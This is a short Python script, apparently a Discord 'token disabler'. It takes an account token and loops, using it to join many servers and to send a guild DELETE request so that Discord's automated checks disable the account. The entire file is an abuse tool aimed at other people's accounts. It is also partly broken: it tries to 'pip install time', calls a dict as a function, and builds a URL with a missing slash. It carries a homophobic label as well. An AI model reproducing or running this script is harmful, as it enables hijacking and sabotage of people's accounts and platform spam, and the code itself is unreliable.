import os

os.system("pip install requests")
os.system("pip install time")

import requests
import json
import sys
import time

token = input("Token: ")

print("Starting el gay disabler...")
# kinda pasted but all code looks the same so dont blame me
while True:
    api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw") # u can change the server to ur server and give it to other ppl so u get more inactive members
    data = api.json()
    check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
    stuff = check.json()
    requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/codm", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/anime", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/growtopia", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/incognito", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/aliucord", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/5toubun", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/tonikawa", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/dragonmaid", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/disney", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/powerkuyofficial", headers={"Authorization": token})
    requests.delete("https://discordapp.com/api/v6/guilds" + data['guild']['id'], headers={"Authorization": token})

    if stuff('code') == 0:
        print("De token has been de disabled :)")
        break
